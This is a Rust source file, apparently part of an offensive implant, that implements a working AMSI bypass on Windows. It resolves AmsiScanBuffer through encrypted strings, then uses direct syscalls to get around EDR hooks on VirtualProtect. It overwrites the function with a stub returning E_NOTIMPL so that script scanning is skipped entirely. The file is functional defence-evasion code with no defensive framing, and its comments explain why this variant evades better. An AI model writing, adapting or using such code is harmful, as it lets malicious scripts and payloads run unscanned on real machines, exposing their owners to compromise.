/// AMSI bypass — patches AmsiScanBuffer to return E_NOTIMPL (0x80004001).
///
/// Returning E_NOTIMPL signals to the host runtime that AMSI is not available,
/// so the CLR's script scanner skips scanning entirely rather than trusting a
/// "clean" result. This is more robust than returning AMSI_RESULT_CLEAN (0).
///
/// Patch bytes: mov eax, 0x80004001 (B8 01 40 00 80) + ret (C3) = 6 bytes.
#[cfg(target_os = "windows")]
pub fn patch() {
    use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};

    // mov eax, 0x80004001 ; ret  (E_NOTIMPL — "AMSI not implemented")
    const STUB: [u8; 6] = [0xB8, 0x01, 0x40, 0x00, 0x80, 0xC3];

    unsafe {
        let amsi_n = { let mut v = oxide_macros::encrypt_str!("amsi.dll").into_bytes(); v.push(0); v };
        let amsi = GetModuleHandleA(amsi_n.as_ptr() as _);
        if amsi == 0 { return; }

        let scan_n = { let mut v = oxide_macros::encrypt_str!("AmsiScanBuffer").into_bytes(); v.push(0); v };
        let scan_buf = GetProcAddress(amsi, scan_n.as_ptr() as _);
        if scan_buf.is_none() { return; }

        let addr = scan_buf.unwrap() as *mut u8;
        // PAGE_EXECUTE_READWRITE = 0x40 — use direct syscall to bypass EDR hook on VirtualProtect
        if let Some(old) = super::syscall::nt_virtual_protect(addr, STUB.len(), 0x40u32) {
            super::syscall::nt_write_virtual_memory(addr, STUB.as_ptr(), STUB.len());
            super::syscall::nt_virtual_protect(addr, STUB.len(), old);
        }
    }
}

#[cfg(not(target_os = "windows"))]
pub fn patch() {}
